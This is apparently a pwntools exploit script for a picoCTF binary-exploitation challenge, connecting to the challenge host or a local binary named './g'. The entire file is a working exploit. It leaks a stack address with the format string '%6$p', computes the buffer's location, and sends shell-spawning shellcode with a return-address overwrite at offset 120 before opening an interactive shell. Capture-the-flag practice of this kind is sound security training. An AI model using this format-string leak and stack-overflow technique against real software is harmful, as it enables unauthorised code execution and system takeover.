from pwn import *

context.binary = ELF("./g", checksec=False)
context.arch = "amd64"
context.log_level = "error"

def main():
    if args.LOCAL:
        io = process("./g")
    else :
       io = remote("wily-courier.picoctf.net",56441)
    shellcode = shellcraft.sh()

    io.sendline("%6$p")
    offset = 120
    delta = 0x188
    leaked_address = int(io.recvlineS(), 16)
    buffer_address = leaked_address - delta

    payload = fit({ 
        0:asm(shellcode),
        offset:p64(buffer_address)
    })
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
